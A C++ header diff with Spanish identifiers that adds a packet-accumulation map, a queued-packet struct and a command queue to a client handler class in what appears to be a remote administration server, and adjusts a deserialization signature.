@@ -10,6 +10,11 @@ struct Paquete {
     char cBuffer[PAQUETE_BUFFER_SIZE];
 };
 
+struct Paquete_Queue {
+    std::vector<char> cBuffer;
+    u_int uiTipoPaquete;
+};
+
 struct TransferStatus {
     std::string strCliente;
     std::string strNombre;
@@ -94,7 +99,11 @@ class Cliente_Handler {
         std::thread p_thQueue;
         
         std::mutex mt_Queue;
-        std::mutex mt_FrameVisible;
+        std::mutex mt_FrameVisible; 
+
+        std::map<int, std::vector<char>> paquetes_Acumulados;
+        
+        std::queue<Paquete_Queue> queue_Comandos;
 
     public:
         std::mutex mt_Archivos;
@@ -114,14 +123,23 @@ class Cliente_Handler {
         }
 
         std::map<const std::string, struct Archivo_Descarga> um_Archivos_Descarga;
-        std::queue<std::vector<char>> queue_Comandos;
         
         struct Cliente p_Cliente;
         bool isRunning = true;
+
+        //funcion para agregar un paquete ya completado al queue
+        void Add_to_Queue(const Paquete_Queue& paquete);
         
-        void Command_Handler();
+        //Procesador y acumulador de paquetes entrantes
+        void Procesar_Paquete(const Paquete& paquete);
+        
+        // thread para procesar comandos ya completos y eliminarlos del map        
         void Process_Queue();
-        void Process_Command(std::vector<char>& cBuffer);
+
+        //Una vez el comando este completo y eliminado del queue de comandos principal
+        void Process_Command(const Paquete_Queue& paquete);
+
+        void Command_Handler();
         void Spawn_Threads();
         void CrearFrame(const std::string strTitle, const std::string strID);
         void EscribirSalidShell(const std::string strSalida);
@@ -241,7 +259,7 @@ class Servidor{
         int cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock = false, int iTipoPaquete = 0);
         int cRecv(SOCKET& pSocket, char* pBuffer, unsigned long pLen, int pFlags, bool isBlock, DWORD* err_code);
         void m_SerializarPaquete(const Paquete& paquete, char* cBuffer);
-        void m_DeserializarPaquete(const char*& cBuffer, Paquete& paquete);
+        void m_DeserializarPaquete(const char* cBuffer, Paquete& paquete);
         int cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock = false, int iTipoPaquete = 0);
         
 
